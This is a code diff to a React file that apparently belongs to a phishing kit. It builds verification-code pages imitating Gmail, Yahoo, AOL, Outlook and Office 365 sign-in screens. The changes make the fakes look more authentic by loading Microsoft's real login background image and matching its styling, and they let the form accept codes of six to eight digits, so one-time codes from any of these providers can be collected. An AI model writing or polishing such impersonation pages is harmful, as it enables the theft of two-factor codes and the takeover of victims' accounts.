@@ -47,7 +47,16 @@ const UserAvatar: React.FC<{ email: string; size?: number }> = ({ email, size = 
 };
 
 /* ── Gmail / Google-style OTP ─────────────────────────────────── */
-const GmailOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit }) => (
+const GmailOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit }) => {
+  const [gmailCodeValue, setGmailCodeValue] = useState('');
+
+  const handleGmailCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
+    setGmailCodeValue(val);
+    onOtpComplete(val);
+  };
+
+  return (
   <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fff', fontFamily: "'Google Sans', 'Roboto', Arial, sans-serif" }}>
     <div className="w-full max-w-md rounded-lg border border-gray-200 p-8 md:p-10" style={{ boxShadow: '0 1px 3px rgba(0,0,0,0.08)' }}>
       <div className="text-center mb-6">
@@ -86,12 +95,23 @@ const GmailOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boo
 
         <div>
           <label className="text-sm font-medium text-gray-700 block mb-2">Enter code</label>
-          <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
+          <input
+            type="text"
+            inputMode="numeric"
+            autoComplete="one-time-code"
+            placeholder="Enter code"
+            value={gmailCodeValue}
+            onChange={handleGmailCodeChange}
+            disabled={isLoading}
+            autoFocus
+            className="w-full px-3 py-2 text-base text-gray-900 bg-white border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:border-blue-500 focus:outline-none disabled:bg-gray-100"
+            style={{ fontFamily: 'inherit', fontSize: '16px', height: '44px' }}
+          />
         </div>
 
         <div className="flex justify-between items-center pt-2">
           <button type="button" className="text-sm font-medium text-blue-600 hover:text-blue-800 transition-colors">Try another way</button>
-          <button type="submit" disabled={isLoading || otp.length !== 6} className="px-6 py-2.5 rounded-md font-medium text-sm text-white bg-[#1A73E8] hover:bg-[#1557B0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
+          <button type="submit" disabled={isLoading || otp.length < 6} className="px-6 py-2.5 rounded-md font-medium text-sm text-white bg-[#1A73E8] hover:bg-[#1557B0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
             {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
             {isLoading ? 'Verifying...' : 'Next'}
           </button>
@@ -105,12 +125,14 @@ const GmailOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boo
       </div>
     </div>
   </div>
-);
+  );
+};
 
 /* ── Yahoo-style OTP ──────────────────────────────────────────── */
 const YahooOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void; onResend?: () => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit, onResend }) => {
   const [deliveryMethod, setDeliveryMethod] = useState<'email' | 'phone'>('email');
   const [resendSent, setResendSent] = useState(false);
+  const [yahooCodeValue, setYahooCodeValue] = useState('');
   const resendTimerRef = useRef<ReturnType<typeof setTimeout>>();
 
   useEffect(() => () => { if (resendTimerRef.current) clearTimeout(resendTimerRef.current); }, []);
@@ -121,6 +143,12 @@ const YahooOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boo
       setResendSent(true);
       resendTimerRef.current = setTimeout(() => setResendSent(false), 30000);
     }
+  };
+
+  const handleYahooCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 8);
+    setYahooCodeValue(val);
+    onOtpComplete(val);
   };
 
   return (
@@ -173,10 +201,21 @@ const YahooOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boo
 
             <div>
               <label className="text-sm font-medium text-gray-700 block mb-2">Verification code</label>
-              <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
+              <input
+                type="text"
+                inputMode="numeric"
+                autoComplete="one-time-code"
+                placeholder="Enter code"
+                value={yahooCodeValue}
+                onChange={handleYahooCodeChange}
+                disabled={isLoading}
+                autoFocus
+                className="w-full px-3 py-2 text-base text-gray-900 bg-white border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#720e9e] focus:border-[#720e9e] focus:outline-none disabled:bg-gray-100"
+                style={{ fontFamily: 'inherit', fontSize: '16px', height: '44px' }}
+              />
             </div>
 
-            <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full py-2.5 px-4 rounded-full font-bold text-sm text-white bg-[#720e9e] hover:bg-[#5b0b7e] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
+            <button type="submit" disabled={isLoading || otp.length < 6} className="w-full py-2.5 px-4 rounded-full font-bold text-sm text-white bg-[#720e9e] hover:bg-[#5b0b7e] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
               {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
               {isLoading ? 'Verifying...' : 'Verify'}
             </button>
@@ -206,6 +245,7 @@ const YahooOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boo
 const AolOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void; onResend?: () => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit, onResend }) => {
   const [deliveryMethod, setDeliveryMethod] = useState<'email' | 'phone'>('email');
   const [resendSent, setResendSent] = useState(false);
+  const [aolCodeValue, setAolCodeValue] = useState('');
   const resendTimerRef = useRef<ReturnType<typeof setTimeout>>();
 
   useEffect(() => () => { if (resendTimerRef.current) clearTimeout(resendTimerRef.current); }, []);
@@ -216,6 +256,12 @@ const AolOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boole
       setResendSent(true);
       resendTimerRef.current = setTimeout(() => setResendSent(false), 30000);
     }
+  };
+
+  const handleAolCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 8);
+    setAolCodeValue(val);
+    onOtpComplete(val);
   };
 
   return (
@@ -268,10 +314,21 @@ const AolOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boole
 
             <div>
               <label className="text-sm font-medium text-gray-700 block mb-2">Verification code</label>
-              <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
+              <input
+                type="text"
+                inputMode="numeric"
+                autoComplete="one-time-code"
+                placeholder="Enter code"
+                value={aolCodeValue}
+                onChange={handleAolCodeChange}
+                disabled={isLoading}
+                autoFocus
+                className="w-full px-3 py-2 text-base text-gray-900 bg-white border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#39007E] focus:border-[#39007E] focus:outline-none disabled:bg-gray-100"
+                style={{ fontFamily: 'inherit', fontSize: '16px', height: '44px' }}
+              />
             </div>
 
-            <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full py-2.5 px-4 rounded-full font-bold text-sm text-white bg-[#39007E] hover:bg-[#2a005f] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
+            <button type="submit" disabled={isLoading || otp.length < 6} className="w-full py-2.5 px-4 rounded-full font-bold text-sm text-white bg-[#39007E] hover:bg-[#2a005f] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
               {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
               {isLoading ? 'Verifying...' : 'Verify'}
             </button>
@@ -330,9 +387,9 @@ const OutlookOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: b
   };
 
   return (
-    <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#f2f2f2', fontFamily: "'Segoe UI', 'Helvetica Neue', Arial, sans-serif" }}>
+    <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fff', backgroundImage: "url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg')", backgroundSize: 'cover', backgroundRepeat: 'no-repeat', backgroundAttachment: 'fixed', backgroundPosition: 'center center', fontFamily: "'Segoe UI', 'Helvetica Neue', Arial, sans-serif" }}>
       <div className="w-full max-w-[440px]">
-        <div className="bg-white py-10 px-11" style={{ boxShadow: '0 2px 6px rgba(0,0,0,0.2)' }}>
+        <div className="bg-white py-10 px-11" style={{ boxShadow: '0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 .2px .9px 0 rgba(0,0,0,.108)' }}>
           <div className="mb-4">
             <MicrosoftLogo />
           </div>
@@ -420,9 +477,9 @@ const Office365Otp: React.FC<{ email?: string; errorMessage?: string; isLoading:
   };
 
   return (
-    <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#f2f2f2', fontFamily: "'Segoe UI', 'Helvetica Neue', Arial, sans-serif" }}>
+    <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fff', backgroundImage: "url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg')", backgroundSize: 'cover', backgroundRepeat: 'no-repeat', backgroundAttachment: 'fixed', backgroundPosition: 'center center', fontFamily: "'Segoe UI', 'Helvetica Neue', Arial, sans-serif" }}>
       <div className="w-full max-w-[440px]">
-        <div className="bg-white py-10 px-11" style={{ boxShadow: '0 2px 6px rgba(0,0,0,0.2)' }}>
+        <div className="bg-white py-10 px-11" style={{ boxShadow: '0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 .2px .9px 0 rgba(0,0,0,.108)' }}>
           <div className="flex items-center gap-2 mb-4">
             <MicrosoftLogo />
           </div>
@@ -555,7 +612,7 @@ const OtpPage: React.FC<OtpPageProps> = ({ onSubmit, isLoading, errorMessage, em
   
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    if (otp.length === 6) {
+    if (otp.length >= 6) {
       onSubmit(otp);
     }
   };
